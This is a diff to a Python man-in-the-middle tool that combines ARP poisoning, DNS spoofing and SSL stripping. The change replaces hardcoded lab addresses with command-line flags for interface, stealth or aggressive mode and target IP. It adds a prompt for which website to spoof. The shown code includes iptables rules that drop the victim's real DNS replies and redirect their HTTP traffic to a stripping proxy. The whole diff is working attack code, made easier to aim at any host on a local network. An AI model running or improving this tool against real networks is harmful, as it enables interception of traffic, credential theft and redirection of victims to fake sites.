@@ -11,19 +11,21 @@ import ssl
 import re
 from collections import defaultdict
 from datetime import datetime
+import argparse
+import ipaddress
 
 # CONFIGURATION (ATTACKER MUST SET THESE)
 # NOTE: In a fully-fledged tool, these will be overwritten by argparse flags.
 CONFIG = {
     # Network Settings
-    "ATTACKER_IP": "192.168.88.226", # Attacker address is my VM's IP, for test purposes
-    "INTERFACE": "ens33", # Network interface my VM uses
-    "VICTIM_IP": "192.168.88.227", # Victim address is my other laptop's IP, for test purposes
+    "ATTACKER_IP": None,
+    "INTERFACE": None,
+    "VICTIM_IP": None,
     
     # Operational Mode: "SILENT" or "ALL_OUT"
     # SILENT  = Targeted DNS spoofing (SPOOF_MAP only), Slow ARP (Stealthy)
     # ALL_OUT = Spoof ALL DNS requests, Fast ARP (Aggressive/Noisy)
-    "MODE": "SILENT" 
+    "MODE": None
 }
 
 # DNS Spoofing Map (Used primarily in SILENT mode)
@@ -240,7 +242,7 @@ def manage_iptables(action):
     # Rule: Drop packets coming FROM the Gateway (DNS Server) to the Victim on UDP port 53
     iptables_command = (
         f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 "
-        f"-d {CONFIG["VICTIM_IP"]} -j DROP"
+        f"-d {CONFIG['VICTIM_IP']} -j DROP"
     )
     print(f"[{action}] Executing IPTables command: {iptables_command}")
     os.system(iptables_command)
@@ -395,7 +397,7 @@ def stop_sniffing(packet):
 def start_dns_spoofing():
     """Starts the continuous sniffing thread for DNS traffic."""
     
-    print(f"[DNS Spoof] Starting DNS sniffer on interface {CONFIG["INTERFACE"]}")
+    print(f"[DNS Spoof] Starting DNS sniffer on interface {CONFIG['INTERFACE']}")
     
     # The filter ensures we only catch UDP traffic on port 53 (DNS)
     sniff_thread = threading.Thread(
@@ -568,7 +570,7 @@ def setup_ssl_strip_iptables():
     """Configure iptables to redirect only HTTP traffic."""
     redirect_cmd = (
         f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
-        f"-s {CONFIG["VICTIM_IP"]} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
     print(f"[SSL Strip] Redirecting HTTP (port 80) to proxy")
     os.system(redirect_cmd)
@@ -577,7 +579,7 @@ def cleanup_ssl_strip_iptables():
     """Remove SSL stripping iptables rules."""
     remove_cmd = (
         f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
-        f"-s {CONFIG["VICTIM_IP"]} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
     os.system(remove_cmd)
 
@@ -596,12 +598,69 @@ def stop_ssl_strip():
 # MAIN EXECUTION AND CLEANUP 
 
 def setup_and_run():
-    global VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC
+    global CONFIG, SPOOF_MAP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC    
+    
+    # Set up the argument parser
+    if_list = get_if_list()
 
-    print(f"[*] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG["VICTIM_IP"]}")
+    parser = argparse.ArgumentParser(prog="Plug-and-play input")
+    parser.add_argument("--interface",
+                        choices=if_list,
+                        default=conf.iface,
+                        help="The network interface you want to use.")
+    parser.add_argument("--mode", 
+                        choices=["SILENT", "ALL_OUT"], 
+                        required=True,
+                        help="The attack mode. You can choose from silent or all-out.")
+    parser.add_argument("--target", 
+                        required=True,
+                        help="The IP address of your target.")
+
+    args = parser.parse_args()
+
+    # Process --interface
+    CONFIG["INTERFACE"] = args.interface
+    CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])
+
+    # Process --mode
+    CONFIG['MODE'] = args.mode
+    if args.mode == "SILENT":
+        map_set = False
+        while not map_set:
+            print("[SETUP] You have selected silent mode. What website do you want to spoof?")
+            website = input()
+            print(f"[SETUP] Is {website} correct? Y/n")
+            answer = input()
+            if answer in ["Y", "y", "Yes", "yes"]:
+                print(f"[SETUP] Spoofing map set to {website}.")
+                SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
+                map_set = True
+            elif answer in ["N", "n", "No", "no"]:
+                continue
+            else:
+                print("[SETUP] Answer not recognised. Try again.")
+    
+    # Process --target
+    # Check what network the attacker is in
+    network = ipaddress.ip_network(f"{CONFIG['ATTACKER_IP']}/24", strict=False)
+    GATEWAY_IP = find_gateway()
+
+    # Check if the target IP is in the correct format, in the network, and is not the gateway
+    try:
+        ip = ipaddress.ip_address(args.target)
+        if ip in network and ip != GATEWAY_IP:
+            CONFIG['VICTIM_IP'] = ip
+        else:
+            print("[SETUP] The given IP address is not within this network or is the gateway IP. Exiting.")
+            sys.exit(1)
+    except ValueError:
+        print("[SETUP] The given IP address is not of a valid format. Exiting.")
+        sys.exit(1)
+
+
+    print(f"[SETUP] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG['VICTIM_IP']}")
 
     # Gather network details
-    GATEWAY_IP = find_gateway()
     GATEWAY_MAC = find_mac(GATEWAY_IP)
     VICTIM_MAC = find_mac(CONFIG["VICTIM_IP"])
 
@@ -610,7 +669,7 @@ def setup_and_run():
         sys.exit(1)
 
     print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
-    print(f"[ARP Poison] The victim at IP address {CONFIG["VICTIM_IP"]} is at MAC address {VICTIM_MAC}.")
+    print(f"[ARP Poison] The victim at IP address {CONFIG['VICTIM_IP']} is at MAC address {VICTIM_MAC}.")
 
     # Enable IP Forwarding (Critical for MiTM)
     # The attacker machine needs to forward the packets between gateway and victim.
